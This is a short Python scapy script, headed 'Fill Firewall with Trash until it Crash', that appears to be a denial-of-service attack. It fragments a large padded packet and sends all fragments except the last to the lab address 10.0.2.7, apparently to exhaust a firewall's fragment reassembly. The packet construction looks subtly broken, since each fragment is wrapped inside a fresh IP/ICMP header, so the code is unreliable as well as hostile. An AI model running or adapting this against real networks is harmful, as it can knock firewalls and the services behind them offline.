#Fill Firewall with Trash until it Crash
from scapy.all import *

frags = fragment(Ether()/IP()/Raw(load="AAAA"*1000), fragsize=100)

for frag in frags[:-1]:
	send(IP(dst="10.0.2.7")/ICMP()/frag)
